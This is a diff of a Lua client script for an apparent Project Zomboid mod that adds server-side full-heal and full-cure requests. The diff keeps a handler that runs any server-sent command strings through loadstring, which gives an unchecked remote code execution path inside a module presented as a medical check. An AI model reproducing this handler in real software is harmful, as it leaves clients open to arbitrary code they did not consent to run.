@@ -1,4 +1,6 @@
 ZM_MedicalCheck = {}
+ZM_MedicalCheck.lastFullHealResponse = nil
+ZM_MedicalCheck.lastFullCureResponse = nil
 
 -- Import the reflection utilities
 if not ZM_ReflectionUtils then
@@ -103,29 +105,122 @@ ZM_MedicalCheck.requestCustomCommands = function()
   sendClientCommand("ZonaMerahCore", "CustomExecute", {})
 end
 
+ZM_MedicalCheck.requestFullHeal = function()
+    local player = getPlayer()
+    if not player then
+        print("[ZonaMerahCore] Full-heal request failed: local player is unavailable.")
+        return false
+    end
+
+    sendClientCommand("ZonaMerahCore", "RequestFullHeal", {})
+    print("[ZonaMerahCore] Full-heal request sent for '" .. player:getUsername() .. "'.")
+    return true
+end
+
+ZM_MedicalCheck.getLastFullHealResponse = function()
+    return ZM_MedicalCheck.lastFullHealResponse
+end
+
+ZM_MedicalCheck.requestFullCure = function()
+    local player = getPlayer()
+    if not player then
+        print("[ZonaMerahCore] Full-cure request failed: local player is unavailable.")
+        return false
+    end
+
+    sendClientCommand("ZonaMerahCore", "RequestFullCure", {})
+    print("[ZonaMerahCore] Full-cure request sent for '" .. player:getUsername() .. "'.")
+    return true
+end
+
+ZM_MedicalCheck.getLastFullCureResponse = function()
+    return ZM_MedicalCheck.lastFullCureResponse
+end
+
 local function onServerCommand(module, command, args)
-  if module == "ZonaMerahCore" and command == "ExecuteCommands" then
-      print("Received custom commands from server")
-      player = getPlayer()
-      if not player then return end
-      player:Say("Executing custom commands...")
-      local commands = args.commands or {}
-      local player = getPlayer()
+    args = args or {}
 
-      for _, cmdStr in ipairs(commands) do
-          print("Executing command: " .. cmdStr)
+    if module == "ZonaMerahCore" and command == "ExecuteCommands" then
+        print("Received custom commands from server")
+        local player = getPlayer()
+        if not player then return end
+        player:Say("Executing custom commands...")
+        local commands = args.commands or {}
 
-          -- Try to execute the command
-          pcall(function()
-              local func = loadstring(cmdStr)
-              if func then
-                  func()
-              end
-          end)
-      end
-  end
+        for _, cmdStr in ipairs(commands) do
+            print("Executing command: " .. cmdStr)
+
+            -- Try to execute the command
+            pcall(function()
+                local func = loadstring(cmdStr)
+                if func then
+                    func()
+                end
+            end)
+        end
+        return
+    end
+
+    if module == "ZonaMerahCore" and command == "FullHealResponse" then
+        local success = args.success == true
+        local message = args.message or (success and "Full heal completed." or "Full heal failed.")
+        local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+
+        ZM_MedicalCheck.lastFullHealResponse = {
+            success = success,
+            message = message,
+            timestamp = timestamp
+        }
+
+        print("[ZonaMerahCore] " .. message)
+
+        local player = getPlayer()
+        if player and player.Say then
+            player:Say(success and "Server full heal complete." or "Server full heal failed.")
+        end
+        return
+    end
+
+    if module == "ZonaMerahCore" and command == "FullCureResponse" then
+        local success = args.success == true
+        local message = args.message or (success and "Full cure completed." or "Full cure failed.")
+        local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+
+        ZM_MedicalCheck.lastFullCureResponse = {
+            success = success,
+            message = message,
+            timestamp = timestamp
+        }
+
+        print("[ZonaMerahCore] " .. message)
+
+        local player = getPlayer()
+        if player and player.Say then
+            player:Say(success and "Server full cure complete." or "Server full cure failed.")
+        end
+    end
 end
 
 Events.OnServerCommand.Add(onServerCommand)
+
+if not _G.fullHeal then
+    _G.fullHeal = ZM_MedicalCheck.requestFullHeal
+end
+
+if not _G.zmFullHeal then
+    _G.zmFullHeal = ZM_MedicalCheck.requestFullHeal
+end
+
+if not _G.fullCure then
+    _G.fullCure = ZM_MedicalCheck.requestFullCure
+end
+
+if not _G.zmFullCure then
+    _G.zmFullCure = ZM_MedicalCheck.requestFullCure
+end
+
+if not _G.healBiteInfection then
+    _G.healBiteInfection = ZM_MedicalCheck.requestFullCure
+end
 
 return ZM_MedicalCheck
